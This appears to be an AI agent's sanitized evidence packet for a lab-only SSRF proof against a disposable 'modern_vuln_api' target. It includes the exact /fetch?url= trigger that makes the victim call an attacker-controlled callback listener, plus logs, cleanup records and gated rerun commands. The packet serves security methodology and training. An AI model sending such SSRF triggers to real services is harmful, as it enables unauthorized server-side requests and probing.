> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# Modern API SSRF True-Attacker Callback Evidence Packet

Status: completed / reusable_methodology / verified-impact lab-only
Source: Hermes synthesis of verified operator-run artifacts
Date: 2026-05-23
Repo truth: `handoff/modern_api_ssrf_true_attacker_callback_verified_20260523.md`, `handoff/ssrf_operator_run_card_20260523.md`, `modules/bundles/verified_lab_flow_modern_api_ssrf_isolated_callback.md`, `handoff/proof_library_index_20260523.md`
Run ID: `modern_api_ssrf_operator_20260523T074358Z`

## Reviewer identity

- Reviewer route/tool: Hermes local control-plane synthesis
- Visible runtime model: `gpt-5.5` / `openai-codex` as exposed by current Hermes session
- Provider / CLI version if visible: provider exposed as `openai-codex`; CLI wrapper version not exposed
- Review focus: evidence quality, route safety, reproducibility, callback truth-labeling, report-readiness gate
- Limitation: no new target-touching test was performed during this packet consolidation; this packet standardizes already verified operator-run artifacts and file contents pulled back to the repo.

## Target

- Target name: `modern_vuln_api` SSRF local lab target
- Target URL / service: `http://<lab-ip>:18081`
- Victim route: `<victim-vm>` / `<lab-ip>`
- Attacker/tool route: `<attacker-vm>` / `<lab-ip>`
- Callback listener: `http://<lab-ip>:18183`
- Artifact root: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/`

## Vulnerability class

- Class: Server-Side Request Forgery (SSRF)
- OWASP / CWE mapping: OWASP SSRF family / CWE-918
- One-vulnerability boundary: one disposable `/fetch?url=...` endpoint induces exactly one server-side HTTP request from the victim target to a host-only attacker listener.
- Why this target demonstrates the class: the victim service fetched an attacker-controlled URL and the attacker listener recorded the callback from the victim VM source IP.

## Authorized scope

- Scope basis: local intentionally vulnerable lab only.
- Public/real target involved: no.
- Safety lane: `local-learning-lab`.
- Operator confirmation: explicit `RUN_SSRF_ON_LOCAL_LAB` confirmation was required and recorded before the final trigger.
- Disallowed surfaces avoided: no public/unknown target, no public OAST/interactsh, no metadata endpoint, no localhost/internal scan, no credential/token capture, no secrets/loot retention, no exfiltration, no persistence, no automatic finding/report promotion.

## Route/tool

- Control plane: Windows Hermes / repo `<private-workspace>`.
- Tool/attacker plane: `<attacker-vm>` running `scripts/labs/operator_ssrf_true_callback_run.sh`.
- Victim plane: `<victim-vm>` Docker-published `modern_vuln_api` target.
- Network posture: host-only lab callback route.
- NAT status: temporary NAT had previously been used for image/tool preparation and then closed; this verified run recorded attacker/victim Internet posture checks and cleanup ended with `internet_closed` for attacker. Boundary remains host-only local-lab proof.
- Tools/scripts used: `scripts/labs/operator_ssrf_true_callback_run.sh`, Docker-published attacker callback listener, Docker-published victim target.

## Preconditions

- Attacker IP: `<lab-ip>`.
- Victim IP: `<lab-ip>`.
- Target health before trigger: HTTP 200 from `http/pre_health.json`.
- Callback/listener setup: Docker-published listener on attacker port `18183`; benign victim-to-attacker listener precheck succeeded before the SSRF trigger.
- Confirmation gate: `operator_confirmation.txt` records the operator's confirmation path for the sensitive local-lab trigger.

## Exploit/probe path

- Discovery path: source-controlled disposable lab target exposes `/fetch?url=...`, which performs a server-side fetch.
- Exact trigger path:

```text
GET http://<lab-ip>:18081/fetch?url=http%3A%2F%2F192.168.56.106%3A18183%2Fssrf-callback%3Fmarker%3Dmodern_api_ssrf_operator_20260523T074358Z
```

- Callback URL:

```text
http://<lab-ip>:18183/ssrf-callback?marker=modern_api_ssrf_operator_20260523T074358Z
```

- Payload/command summary: victim receives `/fetch` request with an attacker-controlled host-only callback URL; victim server-side fetches the callback URL; attacker listener records the request.
- Request caps/timeouts/rate: exactly one final SSRF trigger; precheck callback is separate and labeled with `phase=precheck`.
- Why this is bounded: host-only local callback listener, unique run marker, disposable containers, no metadata/internal scan/public OAST, no secrets or credential material.

## Evidence

Primary artifacts:

- Runner summary: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/summary.md`
- Run transcript: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/run.log`
- Callback log: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/callback/requests.jsonl`
- Pre-health: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/http/pre_health.json`
- Trigger response: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/http/ssrf_trigger_response.json`
- Post-health: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/http/post_health.json`
- Cleanup posture: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/cleanup/attacker_internet.txt`

Verified summary values:

```text
pre_health: 200
ssrf_trigger_status: 200
post_health: 200
callback_marker_found: yes
callback_source_victim_ip_found: yes
callback_trigger_path_found: yes
VERDICT=verified_impact_lab_only
```

Pre-health and post-health both returned:

```json
{"ok": true, "service": "modern-vuln-api", "purpose": "authorized-local-lab"}
```

Trigger response proved the victim fetched the attacker callback URL:

```json
{
  "fetched": "http://<lab-ip>:18183/ssrf-callback?marker=modern_api_ssrf_operator_20260523T074358Z",
  "status": 200,
  "bytes": 39,
  "preview_b64": "U1NSRl9BVFRBQ0tFUl9ET0NLRVJfQ0FMTEJBQ0tfUkVDT1JERUQK"
}
```

Decoded preview:

```text
SSRF_ATTACKER_DOCKER_CALLBACK_RECORDED
```

Authoritative callback evidence:

```json
{"ts": 1779522255.3789155, "client": "<lab-ip>", "path": "/ssrf-callback?marker=modern_api_ssrf_operator_20260523T074358Z", "headers": {"Accept-Encoding": "identity", "Host": "<lab-ip>:18183", "User-Agent": "HermesModernVulnAPI-SSRF-Lab", "Connection": "close"}}
```

Control / precheck distinction:

```json
{"client": "<lab-ip>", "path": "/ssrf-callback?marker=modern_api_ssrf_operator_20260523T074358Z&phase=precheck", "headers": {"User-Agent": "curl/8.19.0"}}
```

The `phase=precheck` callback proves victim-to-attacker listener reachability. The second callback without `phase=precheck` and with `User-Agent: HermesModernVulnAPI-SSRF-Lab` is the SSRF trigger evidence.

## Impact

- Verified impact: server-side request from the victim service to an attacker-controlled host-only callback URL.
- Maximum safe local-lab impact reached: cross-VM true-attacker callback proof with unique marker, victim source IP, trigger response, pre/post health, and cleanup.
- Impact not claimed: public target finding, metadata service access, internal network scan, localhost pivot, credential theft, secret exfiltration, persistence, shell/RCE, privilege escalation, or report-ready bug bounty finding.
- Why this matters for future authorized assessment: this establishes the evidence bar for SSRF-style callback claims before any real scope is considered.

## Controls / false-positive boundary

- The callback marker equals the run ID and appears in both trigger response and callback log.
- The callback source is `<lab-ip>`, matching the victim VM, not the Windows host or attacker loopback.
- The precheck callback is distinguishable by `phase=precheck`; it is not counted as the SSRF impact callback.
- The trigger callback uses the expected path without `phase=precheck` and the expected lab user agent.
- Target pre-health and post-health both returned 200 with service identity.
- Cleanup removed both disposable containers; no persistent listener or target was left behind.
- Remaining uncertainty: this is a source-controlled local target; a real program would still require scope/rules approval and a program-safe callback policy before any testing.

## Cleanup

Script cleanup recorded:

```text
cleanup: removing attacker callback container ssrf-callback-18183
cleanup: removing victim target container modern-api-ssrf-18081
cleanup complete; attacker internet: internet_closed
```

- Containers/processes removed: attacker listener `ssrf-callback-18183`; victim target `modern-api-ssrf-18081`.
- NAT/network restored: attacker cleanup artifact reports `internet_closed`; earlier run log recorded victim Internet posture check before the run.
- Snapshot/restore used: no snapshot restore required.
- Remaining cleanup debt: none recorded for this run.

## Rerun commands

Use only in the authorized local lab after confirming the active route and network posture. The operator confirmation gate is intentional and should not be removed.

```bash
# On <attacker-vm> from the project route/mount:
bash scripts/labs/operator_ssrf_true_callback_run.sh --precheck-only

# If precheck passes and the human operator wants exactly one local-lab trigger:
bash scripts/labs/operator_ssrf_true_callback_run.sh
# then type the exact confirmation required by the script:
# RUN_SSRF_ON_LOCAL_LAB
```

Rerun gate:

- Confirm `<attacker-vm>` is the attacker VM and `<victim-vm>` is the victim VM.
- Confirm attacker/victim host-only IPs before relying on `<lab-ip>` / `<lab-ip>`.
- Confirm NAT/Internet posture after any setup or image pull.
- Run `--precheck-only` first to verify listener and target reachability without sending the SSRF trigger.
- Send exactly one trigger only after explicit human confirmation.
- Pull back safe artifacts only; do not copy secrets, credentials, or raw sensitive data.

## Report-readiness

Decision: `reusable_methodology`

Reason: the local-lab proof is strong and evidence-complete for methodology reuse, but it is not a real bug bounty or pentest finding. It demonstrates the standard evidence packet shape required for SSRF callback claims.

Missing before real bug bounty / pentest use:

- explicit authorized target/program scope;
- written rules allowing SSRF testing and callbacks, including callback domain/listener policy;
- safe request cap/rate/timeout plan;
- target-specific impact model and false-positive controls;
- redaction and evidence minimization policy;
- manual verification / report-readiness review;
- no automatic submission.

## 對專案有什麼幫助

- Capability growth: turns the SSRF lane from isolated local callback and blocked setup into a completed cross-VM true-attacker callback evidence standard.
- Evidence quality improvement: separates precheck from trigger evidence, labels source IP/context, preserves trigger response, callback log, pre/post health, cleanup, and boundary notes.
- Automation/readiness impact: establishes the packet shape that future SSRF/XXE/deserialization callback lanes can copy without inventing new navigation.
- False-positive/precondition lesson: listener reachability alone is not impact; verified impact requires the actual trigger callback, unique marker, source context, and target health controls.

## 新增/更新了什麼

- Scripts: no script changes in this consolidation; existing runner is `scripts/labs/operator_ssrf_true_callback_run.sh`.
- Bundles: no bundle code changes required; source bundle remains `modules/bundles/verified_lab_flow_modern_api_ssrf_isolated_callback.md`.
- Handoffs: added this evidence packet `handoff/modern_api_ssrf_true_attacker_callback_evidence_packet_20260523.md`.
- Obsidian notes: Cybersec Lab project note should point to this packet as the first SSRF evidence-packet rehearsal.
- Artifacts: reused verified artifacts under `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/`; no new runtime artifacts were created.
- Blockers: original Hermes execution-layer denial remains documented; the accepted route is operator-run script with confirmation gate, not bypass/retry.
- Reusable workflow updates: future callback-style proof packets should preserve precheck/trigger separation, source IP truth-labeling, exact marker, target health, cleanup, and report-readiness decision.
